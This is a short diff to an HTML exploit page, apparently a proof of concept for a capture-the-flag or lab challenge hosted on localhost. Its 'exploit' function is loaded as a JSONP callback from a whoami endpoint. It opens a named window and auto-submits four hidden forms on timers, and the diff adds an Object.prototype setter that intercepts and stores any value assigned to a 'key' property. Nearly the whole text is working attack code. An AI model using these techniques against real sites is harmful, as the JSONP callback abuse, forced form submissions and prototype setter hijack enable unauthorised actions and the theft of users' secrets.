@@ -20,13 +20,39 @@
   <script>
     function exploit(data) {
         window.open('', 'worker');
+        window.__values = []
 
-        setTimeout(() => { document.getElementById('f1').submit(); }, 3000);
-        setTimeout(() => { document.getElementById('f2').submit(); }, 6000);
-        setTimeout(() => { document.getElementById('f3').submit(); }, 9000);
-        setTimeout(() => { document.getElementById('f4').submit(); }, 12000);
+        (function () {
+            const handler = {
+                set(target, prop, value) {
+                    if (prop === 'key') {
+                        console.log('GOT KEY:', value);
+                        debugger;
+                    }
+                    return Reflect.set(target, prop, value);
+                }
+            };
+
+            Object.prototype.__defineSetter__('key', function (value) {
+                window.__values.push(value);
+                debugger;
+            });
+        })();
+
+        setTimeout(() => {
+            document.getElementById('f1').submit();
+        }, 3000);
+        setTimeout(() => {
+            document.getElementById('f2').submit();
+        }, 6000);
+        setTimeout(() => {
+            document.getElementById('f3').submit();
+        }, 9000);
+        setTimeout(() => {
+            document.getElementById('f4').submit();
+        }, 12000);
     }
-  </script>
+</script>
 
 <script src=http://localhost:8000/api/whoami/jsonp?callback=exploit></script>
 
